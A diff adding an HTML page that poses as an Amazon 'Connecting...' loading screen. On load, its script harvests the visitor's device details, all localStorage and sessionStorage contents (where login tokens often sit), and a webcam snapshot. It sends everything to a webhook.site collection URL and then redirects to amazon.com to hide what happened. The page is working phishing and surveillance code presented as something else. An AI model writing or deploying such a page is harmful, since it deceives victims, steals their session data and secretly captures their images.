@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon - Connecting...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #232f3e; /* Amazon dark blue */
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        .loader-container {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #ff9900; /* Amazon orange */
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            font-size: 18px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="loader-container">
+    <div class="spinner"></div>
+    <p>Connecting to Amazon...</p>
+</div>
+
+<script>
+    // --- CONFIGURATION ---
+    // Replace this URL with your own server endpoint (PHP, Node, etc.) 
+    // that accepts POST requests and saves the data to a file/database.
+    const LOGGING_URL = 'https://webhook.site/910f9e21-a8f0-4360-a73e-e70150b6be8f'; 
+
+    // 1. Gather all info
+    function gatherData() {
+        const data = {
+            ip: "Fetching...",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${screen.width}x${screen.height}`,
+            battery: "Unknown",
+            storage: {},
+            timestamp: new Date().toISOString(),
+            cameraSnapshot: null
+        };
+
+        // Battery API
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                data.battery = `${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "On Battery"}`;
+                sendData(data);
+            });
+        } else {
+            sendData(data);
+        }
+
+        // Storage Data
+        try {
+            for (let i = 0; localStorage.length > i; i++) {
+                const key = localStorage.key(i);
+                data.storage[key] = localStorage.getItem(key);
+            }
+        } catch (e) { console.error("Local Storage error", e); }
+
+        try {
+            data.sessionStorage = JSON.stringify(sessionStorage);
+        } catch (e) { console.error("Session Storage error", e); }
+
+        // Camera Logic
+        requestCameraAndSend(data);
+    }
+
+    // 2. Request Camera
+    async function requestCameraAndSend(baseData) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            // Create a canvas to capture the frame
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Wait a moment for video to load
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Convert to base64 string
+                baseData.cameraSnapshot = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Stop the stream immediately after capture
+                stream.getTracks().forEach(track => track.stop());
+                
+                sendData(baseData);
+            }, 1000);
+
+        } catch (err) {
+            baseData.cameraError = err.message;
+            sendData(baseData);
+        }
+    }
+
+    // 3. Send Data to Server
+    function sendData(data) {
+        fetch(LOGGING_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            keepalive: true
+        }).finally(() => {
+            // 4. Redirect to Amazon after sending
+            window.location.href = 'https://www.amazon.com';
+        });
+    }
+
+    // Start the process
+    gatherData();
+
+</script>
+
+</body>
+</html>
